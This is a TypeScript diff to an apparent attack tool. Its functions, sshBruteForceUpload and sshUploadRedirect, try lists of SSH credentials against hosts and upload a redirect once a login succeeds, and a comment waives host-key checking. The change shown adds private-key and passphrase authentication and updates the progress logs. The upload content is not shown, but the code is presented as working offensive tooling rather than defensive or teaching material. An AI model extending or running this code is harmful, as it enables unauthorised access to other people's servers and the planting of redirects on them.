@@ -16,6 +16,10 @@ export interface SSHCredential {
   username: string;
   password: string;
   port?: number;
+  /** PEM-encoded private key (RSA/Ed25519/ECDSA) for key-based auth */
+  privateKey?: string;
+  /** Passphrase for encrypted private keys */
+  passphrase?: string;
 }
 
 export interface SSHUploadResult {
@@ -139,7 +143,13 @@ function createSSHConnection(
       host: credential.host,
       port: credential.port || 22,
       username: credential.username,
-      password: credential.password,
+      // Support both password and private key authentication
+      ...(credential.privateKey
+        ? {
+            privateKey: credential.privateKey,
+            ...(credential.passphrase ? { passphrase: credential.passphrase } : {}),
+          }
+        : { password: credential.password }),
       readyTimeout: timeout,
       // Accept any host key (we're not concerned about MITM for this use case)
       algorithms: {
@@ -362,10 +372,11 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
 
   try {
     // ─── Step 1: Connect via SSH ───
-    log(`🔌 SSH connecting: ${credential.username}@${credential.host}:${credential.port || 22}...`);
+    const authType = credential.privateKey ? 'key' : 'password';
+    log(`🔌 SSH connecting (${authType}): ${credential.username}@${credential.host}:${credential.port || 22}...`);
 
     client = await createSSHConnection(credential, Math.min(timeout, 15000));
-    log(`✅ SSH login success: ${credential.username}@${credential.host}`);
+    log(`✅ SSH login success (${authType}): ${credential.username}@${credential.host}`);
 
     // Get server info
     try {
@@ -547,7 +558,8 @@ export async function sshBruteForceUpload(
 
   for (let i = 0; i < credentials.length; i++) {
     const cred = credentials[i];
-    onProgress?.(`🔑 [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 22}`);
+    const authLabel = cred.privateKey ? '🔐 key' : '🔑 pass';
+    onProgress?.(`${authLabel} [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 22}`);
 
     const result = await sshUploadRedirect({
       credential: cred,
